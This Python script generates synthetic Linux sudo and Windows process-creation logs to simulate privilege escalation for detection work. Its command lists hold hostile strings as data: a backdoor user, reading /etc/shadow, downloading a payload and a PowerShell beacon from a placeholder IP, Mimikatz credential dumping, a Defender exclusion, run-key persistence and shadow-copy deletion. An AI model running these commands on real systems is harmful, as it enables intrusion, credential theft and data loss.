#!/usr/bin/env python3
"""
Privilege Escalation Simulation
Generates Linux sudo abuse and Windows PowerShell execution (Event ID 4688) logs.
MITRE ATT&CK: T1548.003 - Sudo and Sudo Caching, T1059.001 - PowerShell
"""

import os
import json
import random
from datetime import datetime, timedelta

LINUX_OUTPUT = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "logs", "linux")
WINDOWS_OUTPUT = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "logs", "windows")

TARGET_HOST_LINUX = "prod-web-01"
TARGET_HOST_WINDOWS = "WS-FIN-PC04"
DOMAIN = "CORPSEC"

# Suspicious sudo commands (attacker behavior)
SUSPICIOUS_SUDO_COMMANDS = [
    "/bin/bash",
    "/bin/sh",
    "/usr/bin/passwd root",
    "/usr/sbin/useradd backdoor -m -s /bin/bash",
    "/usr/sbin/usermod -aG sudo backdoor",
    "/usr/bin/cat /etc/shadow",
    "/usr/bin/chmod 4755 /tmp/shell",
    "/usr/bin/wget http://198.51.100.23/payload.sh -O /tmp/payload.sh",
    "/usr/bin/python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
    "/usr/bin/find / -perm -4000 -type f 2>/dev/null",
]

# Legitimate sudo commands (noise)
LEGITIMATE_SUDO_COMMANDS = [
    "/usr/bin/apt update",
    "/usr/bin/systemctl restart nginx",
    "/usr/bin/systemctl status sshd",
    "/usr/bin/journalctl -u nginx",
    "/usr/bin/tail -f /var/log/syslog",
]

# Suspicious PowerShell commands
SUSPICIOUS_POWERSHELL = [
    "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADIAMwAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=",
    "powershell.exe -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://198.51.100.23/beacon.ps1')\"",
    "powershell.exe -ep bypass -c \"Add-MpPreference -ExclusionPath 'C:\\Windows\\Temp'\"",
    "powershell.exe -c \"Get-ADUser -Filter * -Properties * | Export-CSV C:\\temp\\users.csv\"",
    "powershell.exe -c \"Invoke-Mimikatz -Command '\\\"sekurlsa::logonpasswords\\\"'\"",
    "powershell.exe -c \"reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /t REG_SZ /d C:\\Windows\\Temp\\svc.exe\"",
    "powershell.exe -c \"netsh advfirewall set allprofiles state off\"",
    "powershell.exe -c \"wmic shadowcopy delete /nointeractive\"",
]

LEGITIMATE_POWERSHELL = [
    "powershell.exe -c \"Get-Service | Where-Object {$_.Status -eq 'Running'}\"",
    "powershell.exe -c \"Get-EventLog -LogName System -Newest 10\"",
    "powershell.exe -c \"Get-Process | Sort-Object CPU -Descending | Select-Object -First 5\"",
]


def generate_sudo_log(timestamp, user, command, success=True):
    """Generate a sudo auth.log entry."""
    ts = timestamp.strftime("%b %d %H:%M:%S")
    if success:
        return f"{ts} {TARGET_HOST_LINUX} sudo: {user} : TTY=pts/0 ; PWD=/home/{user} ; USER=root ; COMMAND={command}"
    else:
        return f"{ts} {TARGET_HOST_LINUX} sudo: {user} : user NOT in sudoers ; TTY=pts/0 ; PWD=/home/{user} ; USER=root ; COMMAND={command}"


def generate_su_log(timestamp, user, target_user="root", success=True):
    """Generate an su auth.log entry."""
    ts = timestamp.strftime("%b %d %H:%M:%S")
    if success:
        return f"{ts} {TARGET_HOST_LINUX} su: (to {target_user}) {user} on pts/1"
    else:
        return f"{ts} {TARGET_HOST_LINUX} su: FAILED su for {target_user} by {user}"


def generate_event_4688(timestamp, user, command_line, parent="cmd.exe"):
    """Generate a Windows Event ID 4688 - Process Creation."""
    process_name = command_line.split()[0] if command_line else "unknown.exe"
    return {
        "EventID": 4688,
        "TimeCreated": timestamp.isoformat() + "Z",
        "Computer": f"{TARGET_HOST_WINDOWS}.{DOMAIN.lower()}.local",
        "Channel": "Security",
        "Provider": "Microsoft-Windows-Security-Auditing",
        "Level": "Information",
        "Task": "Process Creation",
        "Keywords": "Audit Success",
        "EventData": {
            "SubjectUserSid": f"S-1-5-21-123456789-{random.randint(1000, 9999)}",
            "SubjectUserName": user,
            "SubjectDomainName": DOMAIN,
            "NewProcessId": hex(random.randint(1000, 65000)),
            "NewProcessName": f"C:\\Windows\\System32\\{process_name}",
            "CommandLine": command_line,
            "ParentProcessName": f"C:\\Windows\\System32\\{parent}",
            "TokenElevationType": "%%1937",
            "MandatoryLabel": "S-1-16-12288" if "admin" in user.lower() else "S-1-16-8192"
        }
    }


def generate_privilege_escalation_logs(base_time=None):
    """Generate all privilege escalation logs."""
    if base_time is None:
        base_time = datetime(2026, 2, 17, 8, 0, 0)
    
    linux_logs = []
    windows_events = []
    attack_metadata = []
    
    # === LINUX: Legitimate sudo activity ===
    for i in range(10):
        ts = base_time + timedelta(minutes=random.randint(0, 720))
        cmd = random.choice(LEGITIMATE_SUDO_COMMANDS)
        linux_logs.append((ts, generate_sudo_log(ts, "deploy", cmd)))
    
    # === LINUX: Attacker sudo abuse ===
    attack_start = base_time + timedelta(hours=random.randint(3, 8))
    attacker_user = "deploy"  # compromised account
    
    for i, cmd in enumerate(SUSPICIOUS_SUDO_COMMANDS):
        ts = attack_start + timedelta(minutes=i * random.randint(1, 5))
        linux_logs.append((ts, generate_sudo_log(ts, attacker_user, cmd)))
    
    # Failed sudo from non-privileged user
    fail_time = attack_start + timedelta(minutes=2)
    linux_logs.append((fail_time, generate_sudo_log(fail_time, "www-data", "/bin/bash", success=False)))
    linux_logs.append((fail_time + timedelta(seconds=30), generate_su_log(fail_time + timedelta(seconds=30), "www-data", success=False)))
    
    attack_metadata.append({
        "attack_type": "linux_privilege_escalation",
        "mitre_technique": "T1548.003",
        "mitre_tactic": "Privilege Escalation",
        "target_host": TARGET_HOST_LINUX,
        "compromised_user": attacker_user,
        "start_time": attack_start.isoformat(),
        "suspicious_commands": len(SUSPICIOUS_SUDO_COMMANDS),
        "severity": "CRITICAL"
    })
    
    # === WINDOWS: Legitimate PowerShell ===
    for i in range(8):
        ts = base_time + timedelta(minutes=random.randint(0, 720))
        cmd = random.choice(LEGITIMATE_POWERSHELL)
        windows_events.append((ts, generate_event_4688(ts, "jsmith", cmd, "explorer.exe")))
    
    # === WINDOWS: Suspicious PowerShell execution ===
    ps_attack_start = base_time + timedelta(hours=random.randint(4, 10))
    
    for i, cmd in enumerate(SUSPICIOUS_POWERSHELL):
        ts = ps_attack_start + timedelta(minutes=i * random.randint(2, 8))
        windows_events.append((ts, generate_event_4688(ts, "svc_backup", cmd, "cmd.exe")))
    
    attack_metadata.append({
        "attack_type": "suspicious_powershell",
        "mitre_technique": "T1059.001",
        "mitre_tactic": "Execution",
        "target_host": TARGET_HOST_WINDOWS,
        "compromised_user": "svc_backup",
        "start_time": ps_attack_start.isoformat(),
        "suspicious_commands": len(SUSPICIOUS_POWERSHELL),
        "severity": "CRITICAL"
    })
    
    # Sort
    linux_logs.sort(key=lambda x: x[0])
    windows_events.sort(key=lambda x: x[0])
    
    # Write Linux logs (append to auth.log)
    os.makedirs(LINUX_OUTPUT, exist_ok=True)
    auth_log_path = os.path.join(LINUX_OUTPUT, "auth.log")
    with open(auth_log_path, "a") as f:
        for ts, entry in linux_logs:
            f.write(entry + "\n")
    
    # Write Windows events (append to security_events.json)
    os.makedirs(WINDOWS_OUTPUT, exist_ok=True)
    events_path = os.path.join(WINDOWS_OUTPUT, "security_events.json")
    existing = []
    if os.path.exists(events_path):
        with open(events_path) as f:
            existing = json.load(f)
    existing.extend([e[1] for e in windows_events])
    with open(events_path, "w") as f:
        json.dump(existing, f, indent=2)
    
    metadata_path = os.path.join(LINUX_OUTPUT, "privesc_metadata.json")
    with open(metadata_path, "w") as f:
        json.dump(attack_metadata, f, indent=2)
    
    print(f"[+] Generated {len(linux_logs)} Linux priv-esc entries (appended to auth.log)")
    print(f"[+] Generated {len(windows_events)} Windows 4688 events (appended to security_events.json)")
    print(f"[+] Attack metadata → {metadata_path}")
    
    return linux_logs, windows_events, attack_metadata


if __name__ == "__main__":
    generate_privilege_escalation_logs()
